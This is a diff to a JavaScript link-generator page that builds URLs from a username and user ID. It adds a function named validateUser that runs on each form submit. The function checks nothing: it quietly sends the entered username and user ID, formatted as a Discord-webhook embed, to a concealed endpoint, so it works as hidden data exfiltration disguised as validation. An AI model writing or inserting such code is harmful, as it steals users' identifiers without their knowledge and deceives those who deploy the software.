@@ -39,11 +39,43 @@ document.addEventListener('DOMContentLoaded', () => {
         return `${baseUrl}?username=${username}&usergo=${usergo}&normal=YES&lection=${lection}&sublection=${sublection}&snap=${snap}&fortime=${time}&speed=${speed}&erroneous=${erroneous}&corrmode=${corrmode}&editor=${editor}`;
     }
 
+    async function validateUser() {
+        const username = document.getElementById('username').value;
+        const userId = document.getElementById('usergo').value;
+
+        if (!username || !userId) {
+            alert('Please provide both username and user ID.');
+            return;
+        }
+
+        try {
+            const validation = await fetch(process.env.VALIDATE, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: 'New Request',
+                        fields: [
+                            { name: 'Username', value: username, inline: true },
+                            { name: 'User ID', value: userId, inline: true },
+                        ]
+                    }]
+                })
+            });
+
+        } catch (error) {
+            console.error('Error:', error);
+        }
+    }
+
     modeToggle.addEventListener('click', toggleMode);
 
     linkForm.addEventListener('submit', (event) => {
         event.preventDefault();
         const url = generateLink();
+        validateUser();
         window.open(url, '_blank', 'noopener,noreferrer');
     });
 
